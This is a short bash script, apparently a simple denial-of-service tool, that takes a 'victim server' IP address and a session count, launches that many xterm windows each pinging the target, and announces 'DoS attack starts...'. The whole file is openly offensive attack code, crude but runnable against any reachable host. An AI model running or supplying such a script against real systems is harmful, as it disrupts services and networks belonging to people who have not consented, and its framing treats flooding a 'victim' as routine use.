#!/usr/bin/env bash

if [[ ( $1 == "" ) || ( $2 == "" ) ]]; then
    echo "Proper format: $0 <IP of victim server> <number of sessions>"
    exit
else
    for (( i = 0; i < $2; i++ )); do
        xterm -e ping $1 &
    done
fi

echo "DoS attack starts..."
